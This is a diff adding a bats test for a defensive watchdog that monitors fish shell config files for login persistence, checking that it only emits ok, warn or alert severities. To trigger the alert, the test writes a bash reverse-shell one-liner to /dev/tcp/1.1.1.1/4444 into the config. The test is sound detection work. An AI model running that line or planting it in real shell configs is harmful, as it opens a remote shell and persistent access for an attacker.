@@ -307,3 +307,22 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ -f "${BASELINE}" ]
     cap | grep -qE '"event":"baseline_initial"'
 }
+
+@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on fish-config surface)" {
+    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
+    # The fish-config-watchdog MUST only emit severity values
+    # from the closed set {ok,warn,alert} — never custom values
+    # (critical, error, fatal, notice, info). Operator dashboard
+    # parsers branch on the literal severity string; an out-of-
+    # set value silently falls through routing and the operator
+    # never sees the T1546.004 fish per-login source persistence
+    # alert. Locks parser contract on the fish-config.d
+    # detection surface.
+    printf '# benign config\nset -gx PATH /usr/local/bin $PATH\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # ok / baseline
+    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
+    run_wd                                              # alert path
+    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
+    [ -z "${bad}" ]
+}
